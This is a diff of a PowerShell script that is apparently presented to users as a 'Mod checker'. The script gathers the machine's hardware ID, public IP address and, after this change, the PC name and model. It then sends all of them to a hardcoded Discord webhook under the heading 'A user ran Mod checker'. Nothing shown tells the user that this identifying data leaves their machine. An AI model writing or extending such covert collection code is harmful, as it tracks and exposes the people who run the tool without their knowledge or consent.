@@ -2,10 +2,12 @@ $webhookUrl = "https://discord.com/api/webhooks/1341525063995883651/rQp5aNirsqEA
 
 $hwid = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid").MachineGuid
 $ip = Invoke-RestMethod -Uri "https://api64.ipify.org?format=text"
+$pcName = $env:COMPUTERNAME  # Gets the PC name
+$pcModel = (Get-CimInstance -ClassName Win32_ComputerSystem).Model  # Gets the PC model
 
 $embed = @{
     title = ":mag: A user ran Mod checker"
-    description = ":key: **HWID:** ``$hwid```n:globe_with_meridians: **IP:** ``$ip``"
+    description = ":computer: **PC Name:** ``$pcName`` `n:desktop_computer: **PC Model:** ``$pcModel`` `n:key: **HWID:** ``$hwid`` `n:globe_with_meridians: **IP:** ``$ip``"
     color = 16711680
 } 
 
